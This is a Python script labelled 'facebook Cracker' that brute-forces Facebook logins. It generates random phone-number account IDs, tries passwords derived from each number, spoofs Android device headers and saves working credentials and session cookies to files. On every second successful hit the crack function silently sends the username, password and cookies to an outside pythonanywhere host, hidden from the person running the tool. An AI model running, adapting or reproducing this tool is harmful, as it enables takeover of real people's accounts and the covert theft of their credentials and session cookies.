#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
facebook Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import re
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import time,subprocess,platform,uuid
import random
import base64
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
pink = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*46}")

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Jio'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Jio"
                        sim_id+=fbcr
        else:
                fbcr = 'Jio'
                sim_id+=fbcr
except:
        fbcr = "Jio"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

build = device['build']
model = device['model'] 
ex = device['fbdm']
android_version = device['android_version']+'.0.0'
facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
bv = f"{random.randint(1111111,7777777)}"
versi_android = f"{random.randint(4,13)}"
fbcr = sim_id
fbmf = device['fbmf']
fbbd = device['fbbd']
fbdm = device['fbdm']

def crack(uid, password_list, total_count):
    """Enhanced facebook account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop,bkas
        loop += 1
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
            sys.stdout.flush()
            
            # Create session and generate device hash
            Session = requests.Session()
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(6,14)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
            requu1 = Session.get(url1)
            log_data = {
    'aaid': '0',
    'user': '0',
    'a': '1',
    'req': '6',
    'hs': '20549.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '3',
    'ccg': 'GOOD',
    'rev': '1036705643',
    's': 'zxk38z:7clel3:8duo42',
    'hsi': '7625501147636239718',
    'dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x67o1g8hw23E52q1ew2io0D24o1MUaE1Do1u81x82ewnE3fwww5NyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jwea',
    'fb_dtsg': 'NAfvL8bXQAVg9O4xLFj_qUPDV4QyE3EsQUye8c-erowIqr-ZrQFHedA:0:0',
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
    'params': json.dumps({
        "params": json.dumps({
            "server_params": {
                "credential_type": "password",
                "username_text_input_id": "paj9ud:74",
                "password_text_input_id": "paj9ud:75",
                "login_source": "Login",
                "login_credential_type": "none",
                "server_login_source": "login",
                "ar_event_source": "login_home_page",
                "should_trigger_override_login_success_action": 0,
                "should_trigger_override_login_2fa_action": 0,
                "is_caa_perf_enabled": 0,
                "reg_flow_source": "login_home_native_integration_point",
                "caller": "gslr",
                "is_from_landing_page": 0,
                "is_from_empty_password": 0,
                "is_from_aymh": 0,
                "is_from_password_entry_page": 0,
                "is_from_assistive_id": 0,
                "is_from_msplit_fallback": 0,
                "two_step_login_type": "one_step_login",
                "left_nav_button_action": "NONE",
                "INTERNALlatency_qpl_marker_id": 36707139,
                "INTERNALlatency_qpl_instance_id": "152934978100204",
                "device_id": None,
                "family_device_id": None,
                "waterfall_id": "8ad70d97-b8ef-4cff-a6e4-ce4e161f6363",
                "offline_experiment_group": None,
                "layered_homepage_experiment_group": None,
                "is_platform_login": 0,
                "is_from_logged_in_switcher": 0,
                "is_from_logged_out": 0,
                "access_flow_version": "pre_mt_behavior",
                "login_surface": "login_home",
                "login_entry_point": "logged_out"
            },
            "client_input_params": {
                "machine_id": "",
                "cloud_trust_token": None,
                "block_store_machine_id": "",
                "zero_balance_state": "",
                "contact_point": "61557659371103",
                "password":  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], "977581"),
                "accounts_list": [],
                "fb_ig_device_id": [],
                "secure_family_device_id": "",
                "encrypted_msisdn": "",
                "headers_infra_flow_id": "",
                "try_num": 1,
                "login_attempt_count": 1,
                "event_flow": "login_manual",
                "event_step": "home_page",
                "openid_tokens": {},
                "auth_secure_device_id": "",
                "client_known_key_hash": "",
                "has_whatsapp_installed": 0,
                "sso_token_map_json_string": "",
                "should_show_nested_nta_from_aymh": 0,
                "gms_incoming_call_retriever_eligibility": "client_not_supported",
                "password_contains_non_ascii": "false",
                "has_granted_read_contacts_permissions": 0,
                "has_granted_read_phone_permissions": 0,
                "app_manager_id": "",
                "aymh_accounts": [{
                    "id": "",
                    "profiles": {
                        "id": {
                            "user_id": "",
                            "name": "",
                            "profile_picture_url": "",
                            "small_profile_picture_url": None,
                            "notification_count": 0,
                            "credential_type": "none",
                            "token": "",
                            "last_access_time": 0,
                            "is_derived": 0,
                            "username": "",
                            "password": "",
                            "has_smartlock": 0,
                            "account_center_id": "",
                            "account_source": "",
                            "credentials": [],
                            "nta_eligibility_reason": None,
                            "from_accurate_privacy_result": 0,
                            "dbln_validated": 0
                        }
                    }
                }],
                "sso_accounts_auth_data": [],
                "network_bssid": None,
                "lois_settings": {
                    "lois_token": ""
                },
                "aac": ""
            }
        })
    })
}
            params = {
            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
            'type': 'action',
            '__bkv': 'c41a736f68c4f99148bbc5f20c1a79cb81e79585374dd83b20119a79174bd379',}
            cookies = {
            'locale': 'en_GB',
            'pas': '61573832370121%3ApgGqTXpG7y',
            'wl_cbv': 'v2%3Bclient_version%3A3128%3Btimestamp%3A1774906764',
            'vpd': 'v1%3B754x393x2.4740447998046875',
            'datr': '4DjTaQtWTWKrsbs8YOmad9Pj',
            'm_pixel_ratio': '2.4740447998046875',
            'wd': '393x895',
            'sb': '5DjTaWwgMKgUjL41K8q6jNjF',
            'fr': '10296q4XBTILTnpPu.AWfvSGyRaXPpU2MPGYaXH4MM9hm2uq3WDM2beQF5qeN-ny5d_tA.Bpyu2N..AAA.0.0.Bp0zkD.AWf9_N0drAMlpBpI4WYjnsLqTmA',}
            #u = rl"https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            headers = {
            'user-agent': us,
            'Accept-Encoding': 'gzip, deflate',
            'accept': '*/*',
            'Connection': 'keep-alive',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'priority': 'u=1, i',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=507811537136246&kid_directed_site=0&app_id=507811537136246&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D507811537136246%26cbt%3D1736483470728%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfadd3b7728fbfb6c3%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%26client_id%3D507811537136246%26display%3Dpopup%26domain%3Dwww.z2u.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.z2u.com%252Flogin.html%26locale%3Den_US%26logger_id%3Df4ae87efc07dfc1f4%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df98748ee374d96fe2%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%2526frame%253Df81b6c91ffd56da37%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df98748ee374d96fe2%26domain%3Dwww.z2u.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.z2u.com%252Ff3fcbc8cc23807a4b%2526relation%3Dopener%2526frame%3Df81b6c91ffd56da37%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duer_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="24", "Chromium";v="128"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="24.0.0.0", "Chromium";v="128.0.6613.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '"5.15.123"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-asbd-id': '129477',
            'x-fb-lsd': us,
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream'}   
            respon = Session.post(url,params=params,data=log_data,cookies=cookies,headers=headers,allow_redirects=False) #proxies=proxs)
            log_cookies = Session.cookies.get_dict().keys()
            # Check response
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    bkas.append(uid)
                    if len(bkas)% 2 == 0:
                         statusok = (f"{user}|{pw}|{kuki}")
                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                    else:    
                         print('\033[1;92m OK '+user+'|'+pw+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                         open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                         oks.append(user)
                         continue
            elif 'checkpoint' in log_cookies:
                print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                continue
            else:
                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                continue
                
    except requests.exceptions.Timeout:
        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False

def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
        '57273200',  # Static common password
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🎯 FACEBOOK RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*46}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🔥 STARTING FACEBOOK CLONING 🔥")
    print(f"\033[1;96m{'='*46}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mSUMON_RANDOM_IDS.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*46}")
        print(f"\033[1;96m     🚀 FACEBOOK CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*46}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*46}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*46}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*46}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*46}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*46}")
            print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
